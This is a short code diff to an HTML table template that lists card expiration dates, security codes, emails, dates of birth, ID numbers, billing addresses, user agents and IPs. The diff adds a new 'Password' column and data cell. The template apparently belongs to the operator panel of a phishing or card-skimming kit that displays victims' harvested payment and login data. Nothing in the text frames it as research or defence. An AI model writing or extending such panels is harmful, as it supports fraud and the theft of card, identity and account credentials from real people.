@@ -143,15 +143,16 @@
                     <th onclick="sortTable(6)">Expiration Date</th>
                     <th onclick="sortTable(7)">Security Code</th>
                     <th onclick="sortTable(8)">Email</th>
-                    <th onclick="sortTable(9)">Phone Number</th>
-                    <th onclick="sortTable(10)">Date of birth</th>
-                    <th onclick="sortTable(11)">ID Number</th>
-                    <th onclick="sortTable(12)">Billing Address</th>
-                    <th onclick="sortTable(13)">City</th>
-                    <th onclick="sortTable(14)">Province</th>
-                    <th onclick="sortTable(15)">Zip Code</th>
-                    <th onclick="sortTable(16)">User Agent</th>
-                    <th onclick="sortTable(17)">IP</th>
+                    <th onclick="sortTable(9)">Password</th>  <!-- New column -->
+                    <th onclick="sortTable(10)">Phone Number</th>
+                    <th onclick="sortTable(11)">Date of birth</th>
+                    <th onclick="sortTable(12)">ID Number</th>
+                    <th onclick="sortTable(13)">Billing Address</th>
+                    <th onclick="sortTable(14)">City</th>
+                    <th onclick="sortTable(15)">Province</th>
+                    <th onclick="sortTable(16)">Zip Code</th>
+                    <th onclick="sortTable(17)">User Agent</th>
+                    <th onclick="sortTable(18)">IP</th>
                 </tr>
             </thead>
             <tbody>
@@ -166,6 +167,7 @@
                     <td>{{ sub.expiration_date }}</td>
                     <td>{{ sub.security_code }}</td>
                     <td>{{ sub.email }}</td>
+                    <td>{{ sub.password }}</td>  <!-- New data -->
                     <td>{{ sub.phone_number }}</td>
                     <td>{{ sub.date_of_birth }}</td>
                     <td>{{ sub.id_number }}</td>
